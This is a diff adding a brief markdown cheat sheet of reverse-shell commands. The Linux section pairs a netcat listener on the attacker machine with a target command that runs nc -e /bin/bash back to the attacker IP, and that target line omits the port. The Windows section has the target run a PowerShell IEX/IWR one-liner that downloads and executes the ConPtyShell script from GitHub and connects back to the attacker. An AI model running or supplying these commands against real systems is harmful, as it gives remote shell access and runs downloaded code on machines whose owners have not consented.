@@ -1,0 +1,24 @@
+#Reverse Shell with Netcat
+
+Linux
+
+Attacker : 
+nc -lnvp 87(can be any port) -s <attacker ip>
+
+Target :
+nc -e /bin/bash <attacker ip>
+
+Hit Enter a few times on Attacker machine after getting Connection ... received
+You should have access to a reverse shell on the target machine
+
+
+Windows
+
+Attacker : 
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s <attacker ip>
+
+Target :
+Powershell command :
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker ip> 87
+
+
